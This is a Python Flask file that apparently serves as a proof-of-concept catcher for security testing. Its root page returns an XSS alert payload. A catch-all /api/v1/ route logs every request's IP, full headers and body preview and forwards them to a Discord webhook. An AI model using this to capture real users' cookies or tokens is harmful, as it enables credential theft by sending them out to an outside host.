import os
import logging
import requests
from datetime import datetime, timezone
from flask import Flask, request, jsonify

app = Flask(__name__)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%SZ",
)
logger = logging.getLogger(__name__)

DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL")


def get_client_ip():
    forwarded_for = request.headers.get("X-Forwarded-For")
    if forwarded_for:
        return forwarded_for.split(",")[0].strip()
    return request.remote_addr or "unknown"


def send_discord_alert(method, ip, path, body_preview, headers):
    if not DISCORD_WEBHOOK_URL:
        logger.warning("DISCORD_WEBHOOK_URL is not set – skipping Discord notification.")
        return

    # Format headers as key: value lines, capped at 1000 chars (Discord field limit)
    headers_text = "\n".join(f"{k}: {v}" for k, v in headers.items())[:1000]

    payload = {
        "embeds": [
            {
                "title": f"📡 Incoming Request — {method} {path}",
                "color": 0x57F287,
                "fields": [
                    {"name": "🌐 IP Address",       "value": f"`{ip}`",      "inline": True},
                    {"name": "📋 Method",            "value": f"`{method}`", "inline": True},
                    {"name": "📌 Path",              "value": f"`{path}`",   "inline": False},
                    {"name": "🕒 Timestamp",         "value": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": False},
                    {"name": "🗂️ Headers",           "value": f"```{headers_text or '(none)'}```", "inline": False},
                    {"name": "📝 Body (≤150 chars)", "value": f"```{body_preview or '(empty)'}```", "inline": False},
                ],
                "footer": {"text": "Flask Request Logger"},
            }
        ]
    }

    try:
        resp = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
        resp.raise_for_status()
    except requests.RequestException as exc:
        logger.error("Failed to send Discord webhook: %s", exc)


@app.route("/")
def hello():
    return '''
    <script>alert("PoC by machiavelli")</script>
    <h1>PoC by machiavelli</h1>
    '''


# Catches /api/v1/ and anything beneath it — e.g. /api/v1/users/123/orders
@app.route("/api/v1/", defaults={"subpath": ""}, methods=["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"])
@app.route("/api/v1/<path:subpath>",             methods=["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"])
def api_v1(subpath):
    method       = request.method
    ip           = get_client_ip()
    path         = request.path
    body_preview = request.get_data(as_text=True)[:150]
    headers      = dict(request.headers)

    logger.info("method=%s ip=%s path=%s body=%r", method, ip, path, body_preview)
    send_discord_alert(method, ip, path, body_preview, headers)

    return jsonify({"status": "ok", "method": method, "path": path}), 200


if __name__ == "__main__":
    app.run(debug=True)